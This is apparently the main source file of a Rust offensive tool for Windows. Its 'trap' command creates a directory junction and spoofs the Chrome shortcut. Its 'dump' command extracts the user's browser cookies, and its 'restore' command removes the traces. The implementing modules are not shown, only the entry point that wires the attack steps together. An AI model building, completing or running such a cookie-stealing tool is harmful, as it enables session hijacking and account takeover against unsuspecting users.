use clap::Parser;
use tracing::{debug, Level};
use tracing_subscriber::FmtSubscriber;

mod cli;
use cli::{Cli, Commands};

mod shortcut;
use shortcut::{spoof_lnk, restore_lnk};

mod junction;
use junction::{create_junc, remove_junc};

mod browser;

#[async_std::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();

    let max_level = match cli.debug {
        true => Level::DEBUG,
        _ => Level::ERROR,
    };

    let subscriber = FmtSubscriber::builder()
        .with_max_level(max_level)
        .without_time()
        .finish();

    tracing::subscriber::set_global_default(subscriber)
        .expect("setting default subscriber failed");

    match &cli.command {
        Commands::Trap => {
            debug!("\r[*] Retreaving username...");
            let username = std::env::var("USERNAME")?;

            debug!("\r[*] Creating dir junction...");
            let _ = create_junc(&username)?;

            debug!("\r[*] Spoofing Chrome shortcut...");
            let _ = spoof_lnk(&username)?;
        }

        Commands::Dump => {
            debug!("\r[*] Retreaving username...");
            let username = std::env::var("USERNAME")?;

            debug!("\r[*] Dumping cookies...");
            let _ = browser::dump_cookies(&username).await?;
        }

        Commands::Restore => {
            debug!("\r[*] Retreaving username...");
            let username = std::env::var("USERNAME")?;

            debug!("\r[*] Restoring Chrome shortcut...");
            let _ = restore_lnk(&username)?;

            debug!("\r[*] Removing junction and dir...");
            let _ = remove_junc(&username)?;
        }
    }

    Ok(())
}
